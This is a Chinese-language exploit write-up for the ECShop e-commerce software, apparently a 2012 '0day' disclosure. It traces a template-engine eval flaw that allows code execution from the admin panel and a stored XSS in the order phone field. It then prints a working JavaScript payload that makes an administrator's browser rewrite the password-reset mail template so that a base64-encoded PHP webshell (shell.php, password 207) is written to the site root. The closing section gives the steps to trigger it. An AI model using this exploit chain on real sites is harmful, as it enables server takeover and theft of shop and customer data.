@@ -1,0 +1,123 @@
+ecshop最新后台0day漏洞原理+利用方法 XSS+Getshll
+
+布日期：2012-10.25
+ 
+发布作者：dis9@ztz
+ 
+漏洞类型：跨站攻击 代码执行
+ 
+0×0 后台getshell
+ 在 includes/cls_template.php fetch函数
+ 1./**
+ 2.* 处理模板文件
+ 3.*
+ 4.* @access public
+ 5.* @param string $filename
+ 6.* @param sting $cache_id
+ 7.*
+ 8.* @return sring
+ 9.*/
+ 10.function fetch($filename, $cache_id = ”)
+ 11.{
+ 12.if (!$this->_seterror)
+ 13.{
+ 14.error_reporting(E_ALL ^ E_NOTICE);
+ 15.}
+ 16.$this->_seterror++;
+ 17.//若$filename以str:开头则执行下面的语句www.yunsec.net
+ 18.if (strncmp($filename,’str:’, 4) == 0)
+ 19.{
+ 20.$out = $this->_eval($this->fetch_str(substr($filename, 4)));
+ 21.}
+ 22.… … … …
+ 23.可以看到如果$filename以”str:”开头那么就调用_eval()函数执行”str:”后面的代码,不过在执行之前系统调用fetch_str函数进行字符查找和替换。
+ 24._eval():
+ 25.function _eval($content)
+ 26.{
+ 27.ob_start();
+ 28.eval(‘?’ . ‘>’ . trim($content));
+ 29.$content = ob_get_contents();
+ 30.ob_end_clean();
+ 31.return $content;
+ 32.}
+ 33.调用eval()就执行$content了，看fetch_str()
+ 34./**
+ 35.* 处理字符串函数
+ 36.*
+ 37.* @access public
+ 38.* @param string $source
+ 39.*
+ 40.* @return string
+ 41.*/
+ 42.function fetch_str($source)
+ 43.{
+ 44.if (!defined(‘ECS_ADMIN’))
+ 45.{
+ 46.$source = $this->smarty_prefilter_preCompile($source);
+ 47.}
+ 48.$source = preg_replace(“/<\?[^><]+\?>|<\%[^><]+\%>|<script[^>]+language[^>]*=[^>]*php[^>]*>[^><]*<\/script\s*>/iU”, “”, $source);
+ 49.return preg_replace(“/{([^\}\{\n]*)}/e”, “\$this->select(‘\\1′);”, $source);
+ 50.}
+ 51.过滤了php语言的标记。
+ 52.现在需要查看有哪些代码调用了这个函数，找到了这段代码：wholesale.php
+ 53./*—————————————————— */
+ 54.//– 提交订单
+ 55./*—————————————————— */
+ 56.elseif ($_REQUEST['act'] == ‘submit_order’)
+ 57.{
+ 58.include_once(ROOT_PATH . ‘includes/lib_order.php’);
+ 59.… … … … … … … … … … … … …
+ 60.… … … … … … … … … … … … …
+ 61./* 给商家发邮件 */
+ 62.if ($_CFG['service_email'] != ”)
+ 63.{
+ 64.$tpl = get_mail_template(‘remind_of_new_order’);
+ 65.… … … … … … … … … … … …
+ 66.… … … … … … … … … … … …
+ 67.$content = $smarty->fetch(‘str:’ . $tpl['template_content']);
+ 68.… … … … … … … … … … … …
+ 69.}
+ 
+在提交订单的地方看到了代码调用了get_mail_template()获得remind_of_new_order模板的内容，然后放入到fetch中执行，如果可以控制remind_of_new_order模板的内容那就可以让ecshop执行我们的命令了。
+ 在后台可以在模板管理中找到邮件模板，更改remind_of_new_order的内容为”{$phpinfo()’];phpinfo();/*}”，然后在调试中可以看到代码被替换成了”<?php echo $this->_var['phpinfo()'];phpinfo();/*’]; ?>”
+ 代码成功执行。
+ 
+
+
+0×1 前台xss
+ 前台在有些地方过滤不够充分，导致用户可以构造恶意javascript完成对后台管理员的xss攻击。
+ 注册用户以后随便买个东西，收货人信息里电话一栏只有本地的客户端检查，而没有后端过滤，容易招到xss攻击。
+ 
+
+
+0×2 xss+后台getshell
+ 由于没有csrf的防护，因此可以前台xss到后台并让管理员帮我们getshell。
+ 以下是实现getshell的js：
+ 
+
+
+Var Shelldata=’subject=%C3%DC%C2%EB%D5%D2%BB%D8&mail_type=0&tpl=1&content=%7B%24user_name%27%5D%3Bfile_put_contents%28base64_decode%28%27c2hlbGwucGhw%27%29%2Cbase64_decode%28%27PD9waHAgQGV2YWwoJF9QT1NUWycyMDcnXSk7Pz4%3D%27%29%29%3Becho+%24var%5B%27%24user_name%7D%0D%0A%3C%2Fp%3E%0D%0A%3Cp%3E%7B%24user_name%7D%C4%FA%BA%C3%A3%A1%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%C4%FA%D2%D1%BE%AD%BD%F8%D0%D0%C1%CB%C3%DC%C2%EB%D6%D8%D6%C3%B5%C4%B2%D9%D7%F7%A3%AC%C7%EB%B5%E3%BB%F7%D2%D4%CF%C2%C1%B4%BD%D3%28%BB%F2%D5%DF%B8%B4%D6%C6%B5%BD%C4%FA%B5%C4%E4%AF%C0%C0%C6%F7%29%3A%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%3Ca+target%3D%22_blank%22+href%3D%22%7B%24reset_email%7D%22%3E%7B%24reset_email%7D%3C%2Fa%3E%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%D2%D4%C8%B7%C8%CF%C4%FA%B5%C4%D0%C2%C3%DC%C2%EB%D6%D8%D6%C3%B2%D9%D7%F7%A3%A1%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%7B%24shop_name%7D%3Cbr+%2F%3E%0D%0A%7B%24send_date%7D%3C%2Fp%3E’; try{ var xml = window.XMLHttpRequest ? (new XMLHttpRequest()) : (new ActiveXObject(‘Microsoft.XMLHTTP’)); xml.open(“POST”,’/ecshop/upload/admin/mail_template.php?act=save_template’,false); xml.setRequestHeader(‘Content-Type’, ‘application/x-www-form-urlencoded’); xml.onreadystatechange = function(){if(xml.readyState == 4){}}; xml.send(Shelldata); }catch(e){} 
+
+
+ 
+ 
+上传这个js的图片并引用或者直接从外部网站引用都可以。为了测试方便，从本地引用
+ 
+
+
+最后提交订单，管理员访问该订单，用户找回密码，就会在根目录生成shell.php，密码207.
+ 
+管理员访问订单前的找回密码模板：
+ 
+
+
+管理员查看订单
+ 
+
+
+查看之后的邮件模板
+ 
+
+
+最后用户前台找回密码，根目录下生成一句话shell.php
+ 
